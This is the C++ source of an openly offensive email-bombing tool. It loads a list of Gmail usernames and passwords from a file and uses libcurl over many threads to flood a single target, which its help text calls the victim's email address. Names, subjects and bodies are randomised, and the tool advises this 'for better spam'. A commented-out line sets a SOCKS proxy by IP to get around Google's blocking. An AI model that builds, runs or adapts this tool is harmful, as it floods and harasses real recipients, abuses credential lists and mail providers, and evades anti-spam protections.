#include <iostream>
#include <vector>
#include <fstream>
#include <thread>
#include <curl/curl.h>
#include <cstring>
#include <locale.h>
#include <sstream>

using namespace std;

const string CREATE_BY	= "IGORERFC";
const string VERSION	= "VERSION 3.62";

const string name_file_emails  = "emails";	//The files must be created and located in the same folder as the program
const string name_file_text    = "text";	//The files must be created and located in the same folder as the program
const string name_file_history = "history";

const string google_service = "smtp://smtp.gmail.com:587" ;

unsigned int number_of_errors = 0;
unsigned int number_sequence =  0;

static string payloadText[11];

struct upload_status { int lines_read; };

struct account {
	string login;
	string pass;
};

struct email_content{
	string name;
	string subject;
	string body;
};

//error code
enum{
		error_fatal 	= 1,
		error_no_fatal  = 0
};

//void error
void v_error(string error_text,bool fatal_or_not) 
{
	if(fatal_or_not == error_no_fatal){
		cout << endl << " ERROR :" << error_text << endl
			<<" Use the argument '-h' "<<endl;
	}
	
	if(fatal_or_not == error_fatal){
		cout << endl << " FATAL ERROR :" << error_text << endl
			<<" Use the argument '-h' "<<endl;
		exit(-1);
	}
}

void setPayloadText(const string &to,
                    const string &from,
                    const string &nameFrom,
                    const string &subject,
                    const string &body
                    )
{
    payloadText[ 0] = "Date: " ;
    payloadText[ 1] = "To: <"   + to   + ">\r\n";
    payloadText[ 2] = "From: " + nameFrom + " <sender@example.org>\r\n",
    payloadText[ 3] = "Cc: <"   + to   + "> (" + nameFrom + ")\r\n";
    payloadText[ 4] = "Message-ID: <@" + from.substr(from.find('@') + 1) + ">\r\n";
    payloadText[ 5] = "Subject: " + subject + "\r\n";
    payloadText[ 6] = "\r\n";
    payloadText[ 7] = body + "\r\n";
    payloadText[ 8] = "\r\n";
    payloadText[ 9] = "\r\n";
    payloadText[10] = "\r\n"; 
}

static size_t payload_source(void *ptr, size_t size, size_t nmemb, void *userp)
{

    static const char *pt[12] = {};

    for (int i = 0; i < 11; ++i) {
        pt[i] = payloadText[i].c_str();
    }

    pt[11] = NULL;

    struct upload_status *upload_ctx = (struct upload_status *)userp;
    const char *data;

    if ((size == 0) || (nmemb == 0) || ((size*nmemb) < 1)) {
        return 0;
    }

    data = pt[upload_ctx->lines_read];

    if (data) {
        size_t len = strlen(data);
        memcpy(ptr, data, len);
        upload_ctx->lines_read++;

        return len;
    }

    return 0;
}

//sending an email using curl
CURLcode sendEmail(	const string &to,
			const string &from,
			const string &password,
			const string &nameFrom,
			const string &subject,
			const string &body,
			const string &url
			)
{
    CURLcode ret = CURLE_OK;

    struct curl_slist *recipients = NULL;
    struct upload_status upload_ctx;

    upload_ctx.lines_read = 0;

    CURL *curl = curl_easy_init();

    setPayloadText(to, from, nameFrom, subject, body);

    if (curl) {
        curl_easy_setopt(curl, CURLOPT_USERNAME,     from    .c_str());
        curl_easy_setopt(curl, CURLOPT_PASSWORD,     password.c_str());
        curl_easy_setopt(curl, CURLOPT_URL,          url     .c_str());

        curl_easy_setopt(curl, CURLOPT_USE_SSL,      (long)CURLUSESSL_ALL);

        curl_easy_setopt(curl, CURLOPT_MAIL_FROM,    ("<" + from + ">").c_str());
        recipients = curl_slist_append(recipients,   ("<" + to   + ">").c_str());

        curl_easy_setopt(curl, CURLOPT_MAIL_RCPT,    recipients);
        curl_easy_setopt(curl, CURLOPT_READFUNCTION, payload_source);
        curl_easy_setopt(curl, CURLOPT_READDATA,     &upload_ctx);
        curl_easy_setopt(curl, CURLOPT_UPLOAD,       1L);
        curl_easy_setopt(curl, CURLOPT_VERBOSE,      1L);
        
     // curl_easy_setopt(curl, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5); 
     // curl_easy_setopt(curl, CURLOPT_PROXY, "109.194.175.135:9050");//Google blocks ;-(
        
		curl_easy_setopt(curl,CURLOPT_VERBOSE,0);
		
        ret = curl_easy_perform(curl);

        curl_slist_free_all(recipients);
        curl_easy_cleanup(curl);
    }

    return ret;
}

//generating a random string
string gen_random(const int len) 
{
    static const char alphanum[] =
        "0123456789"
        "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        "abcdefghijklmnopqrstuvwxyz";
	string s;
	
    for (int i = 0; i < len; ++i) {
        s += alphanum[rand() % (sizeof(alphanum) - 1)];
    }

    return s;
}

//Getting text from a file text
string get_text_from_txt(string file_name)
{
	fstream fout;
	fout.open(file_name,ios::in);
	
	if (!fout.is_open())
		 v_error(" File opening error! " + file_name, error_fatal);
		 
	char file_str[200];
	string for_ret;
	
	while (fout.getline(file_str, INT_MAX)){
		for_ret += file_str;
		for_ret += '\n';		
	}
	fout.close();
	for_ret[for_ret.size()-1]='\0';	//Delete '\n'
	return for_ret;
}

//Determining what this string is
string what_str(string str_input)
{
	if (str_input == "r")
		return gen_random(rand() % 25 + 1);
	else
		if(str_input == "s")
			return string(to_string(++number_sequence));
		else
			if(str_input == "fr")
				return(get_text_from_txt(name_file_text));
			else
				return str_input;
}

//To send emails correctly and quickly
int vec_const_init(int begin_send,int size_vec)
{
	int int_for_ret=0;
	for(int i=0;i<begin_send;i++){
		int_for_ret ++;
		if(int_for_ret == size_vec)int_for_ret = 0;
	}
	return int_for_ret;
}

//Sending emails (in the amount specified by the user)
void use_threads_for_send_mail(	vector <account> emails, 
				int num_cycles,
				int begin_send,
				string email_attack, 
				email_content content
				) 
{	
	CURLcode err;
	
	const int vec_email_begin = vec_const_init(begin_send,emails.size());
	int vec_email_num = vec_email_begin;
	
	for (int i = 0; i < num_cycles; i++){
		while(true)
		{
			err = sendEmail
				(
				email_attack			 		.c_str(),
				emails[vec_email_num].login		.c_str(),
				emails[vec_email_num].pass		.c_str(),
				what_str(content.name) 	 		.c_str(),
				what_str(content.subject)		.c_str(),
				what_str(content.body)	 		.c_str(),
				google_service			 		.c_str()
				);
			if(err)
			{
				v_error("curl_easy_perform() failed: \n " + (string)curl_easy_strerror(err) + " " + emails[vec_email_num].login,error_no_fatal);
				number_of_errors++;
			}
			else
				cout << " Sent to - " << email_attack << endl
					 << " From - " 	<< emails[vec_email_num].login << endl
					 << " Thread ID - " << this_thread::get_id() << endl 
					 << " Thread number - " << begin_send + 1 << endl
					 << endl;
			/*to send emails correctly and quickly*/
			vec_email_num++;	
			if(vec_email_num == (int)emails.size()) vec_email_num = 0;
			if(vec_email_num == vec_email_begin) break;
		}
		vec_email_num = vec_email_begin;
	}
}

//Convert 
account string_to_account(string str_input)
{
		account account_forret;
		bool b = false;
		for (int i = 0; str_input[i] != '\0'; i++) {
			if (b == true)
				account_forret.pass += str_input[i];
			if (str_input[i] != ':' && b == false)
				account_forret.login += str_input[i];
			else b = true;
		}
		if(b == false) v_error(" Invalid string! ", error_no_fatal);
		return account_forret;
}

//Getting usernames and passwords from a file emails
void get_mail_from_txt(vector <account> *emails,string file_name)
{
	stringstream text(get_text_from_txt(file_name));
	string line;
	while(getline(text, line))
        	emails->push_back(string_to_account(line));
}

//Write history to the history file
void write_file(string str_write,string file_name)
{
	ofstream fout;
	fout.open(file_name,ios::out | ios_base::app);
	
	if (!fout.is_open())
		 v_error(" File opening error! " + file_name, error_fatal);
		 
	fout << str_write;
	fout.close();
}

void arguments_function(string *email_attack,
			email_content *content,
			int *num_cycles,
			int *num_threads,
			int argc, 
			char **argv
			)
{
	
	if(argc == 2){
		string str(argv[1]);
		if(str == "-h" || str == "--help"){
			cout<< endl;
			cout<< " Use '-h' or '--help' arguments to get information " << endl << endl;
			cout<< " You can use 'r' for random or 's' for sequence" << endl;
			cout<< " Enter \"fr\" to use the text from the file" << endl;
			cout<< " To use arguments, enter all 6 in order : "	<< endl
				<< "\t victim's email address " 		<< endl
				<< "\t your name \t\t\t( r/s ) " 		<< endl
				<< "\t the subject of the letter \t( r/s ) " 	<< endl
				<< "\t the text of the letter \t( r/s/fr ) " 	<< endl
				<< "\t the number of cycles " 			<< endl
				<< "\t the number of threads" 			<< endl;
			cout<< endl << " I recommend (for better spam) using 'r' where possible" << endl;
			cout<< " Example: ./name email@email.com r r r 5 30" << endl; 
			
			cout<< endl << " The files must be created and located in the same folder as the program " << endl;
			cout<< " Name of the emails file \""+name_file_emails+"\"" 	<< endl;
			cout<< " Name of the text file \""+name_file_text+"\"" 		<< endl;
			cout<< " Name of the history file \""+name_file_history+"\""<< endl << endl;
			cout<< " Add emails in the format email@email.com:pass to file emails "<< endl
				<< " Allow untrusted apps to access your account "	<< endl;

			exit(0);
		}
	}
	if(argc == 7){
		*email_attack = 	argv[1];
		content->name = 	argv[2];
		content->subject = 	argv[3];
		content->body = 	argv[4];
		*num_cycles = 		atoi(argv[5]);
		*num_threads = 		atoi(argv[6]);
	} 
	else
		if(argc != 1)
			v_error(" Incorrect arguments! ", error_fatal);
}

void preview()
{
	cout << " CREATE BY " << CREATE_BY << endl;
	cout << " VERSION "   << VERSION   << endl;
}

int main(int argc, char *argv[])
{
	/*Init*/
	preview();
	srand(time(NULL));
	setlocale(LC_ALL,"Rus");
	
	
	string email_attack = "";
	
	email_content content = {"","",""};
	
	int num_cycles = 0;
	int num_threads = 0;
	
	
	arguments_function(	&email_attack,
				&content,
				&num_cycles,
				&num_threads,
				argc,
				argv
				);
	
	vector <account> emails;
	
	get_mail_from_txt(&emails,name_file_emails);
	
	cout << " " << emails.size() << " - GOOGLE MAIL WAS FOUND  " << endl;
	
	if(!emails.size()) v_error( " There are no emails ! \
					\n Add emails in the format email@email.com:pass to file emails\
					\n Allow untrusted apps to access your account",
					error_fatal
					);
	/*Init end*/
	
	/*Read*/
	if(email_attack == "")
	{
		cout << " Write an email address for sending messages : ";
		getline ( cin,email_attack);
	}
	write_file(email_attack+'\n',name_file_history);
	
	if(content.name == "")
	{
		cout << " You can use 'r' for random or 's' for sequence "<< endl;
	
		cout << " Enter your name (r/s) : ";
		getline ( cin,content.name);
		
		cout << " Enter the subject of the letter (r/s) : ";
		getline ( cin,content.subject);
	
		cout << " Enter 'fr' to use the text from the file" << endl;
		cout << " Enter the text of the letter (r/s/fr) : ";
		getline ( cin,content.body);
	}
	
	if(num_cycles == 0)
	{
		cout << " Enter the number of cycles (min - 1) : ";
		cin >> num_cycles;
	}
	if (num_cycles < 1)	v_error(" Invalid input data ",error_fatal);
	
	if(num_threads == 0)
	{
		cout << " Don't specify too much threads, google services will block you (100 <)" << endl;
		cout << " Enter the number of threads (min - 1 & 100 <) : ";
		cin >> num_threads;
	}
	if (num_threads < 1)v_error(" Invalid input data ",error_fatal);
	
	cout << " " << num_cycles * num_threads * emails.size() << " - will be sent " << endl << endl;
	/*Read end*/
	
	/*Sending mails*/
	thread* th = new thread[num_threads];
	for (int thread_number = 0; thread_number < num_threads; thread_number++)
		th[thread_number] = thread
		(
		use_threads_for_send_mail, 
		emails, 
		num_cycles,
		thread_number,	//to send email correctly // the thread number
		email_attack,
		content
		);
	for (int thread_number = 0; thread_number < num_threads; thread_number++)
		th[thread_number].join();
	/*Sending mails end*/
	
	/*Output of the work result*/
	cout << " " << num_cycles * num_threads * emails.size() - number_of_errors << " - emails sent successfully !" << endl;
	/*Output of the work result end*/
	
}
